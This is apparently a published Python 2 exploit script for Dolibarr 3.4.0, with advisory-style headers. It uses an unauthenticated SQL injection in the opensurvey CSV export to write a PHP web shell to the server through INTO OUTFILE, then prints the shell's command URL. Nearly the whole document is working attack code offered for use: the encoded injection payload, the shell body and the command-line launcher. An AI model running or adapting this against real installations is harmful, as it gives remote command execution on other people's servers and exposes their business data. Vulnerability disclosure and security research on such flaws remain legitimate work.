# Date: 10/7/2013
# Exploit author: drone (@dronesec)
# More information: http://forelsec.blogspot.com/2013/10/dolibarr-340-multiple-vulnerabilities.html
# Vendor homepage: http://www.dolibarr.org/
# Software link:
# Version: 3.4.0
# Fixed in: 3.4.1
# Tested on: Ubuntu 12.04 (apparmor disabled)
 
import urllib2
import string
import random
from argparse import ArgumentParser
 
""" Preauth web shell via SQL injection
    Dolibarr 3.4.0
"""
 
def run(options):
    """ run exploit
    """
    print &#039;[!] Dropping web shell on %s...&#039; % options.ip
    shell = &#039;&#039;.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))
    sqli = &#039;http://{0}{1}/htdocs/opensurvey/public/exportcsv.php?sondage=&#039;\
                                            .format(options.ip, options.rootp)
 
    # &#039; UNION SELECT &#039;<?php system($_GET[&#039;cmd&#039;])?>,2,3,[..]13 INTO OUTFILE &#039;yourshell&#039;;-- -
    exploit = &#039;\&#039;%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20\&#039;<?php%20system($_GET[\\\&#039;cmd\\\&#039;])?>\&#039;&#039;\
              &#039;,2,3,4,5,6,7,8,9,10,11,12,13%20INTO%20OUTFILE%20\&#039;{0}/{1}.php\&#039;;%20--%20-%20&#039;\
                        .format(options.path, shell)
 
    try:
        urllib2.urlopen(sqli + exploit)
        print &#039;[!] Shell dropped.  http://%s%s/documents/%s.php?cmd=ls&#039; % \
                                                    (options.ip, options.rootp, shell)
    except Exception, e:
        print &#039;[-] %s&#039; % e
 
def parse():
    """ Parse cli
    """
    parser = ArgumentParser()
    parser.add_argument(&#039;-i&#039;, help=&#039;Server address&#039;, action=&#039;store&#039;, dest=&#039;ip&#039;, required=True)
    parser.add_argument(&#039;-p&#039;, help=&#039;Path to Dolibarr install (/dolibarr)&#039;, action=&#039;store&#039;,
                            default=&#039;/dolibarr&#039;, dest=&#039;rootp&#039;)
    parser.add_argument(&#039;-w&#039;, help=&#039;Path to drop shell (/var/www/dolibarr/documents)&#039;,
                            action=&#039;store&#039;, default=&#039;/var/www/dolibarr/documents&#039;, dest=&#039;path&#039;)
 
    options = parser.parse_args()
    options.path = options.path if options.path[-1] != &#039;/&#039; else options.path[:-1]
    options.rootp = options.rootp if options.path[-1] != &#039;/&#039; else options.path[:-1]
    return options
 
if __name__ == "__main__":
    run(parse())

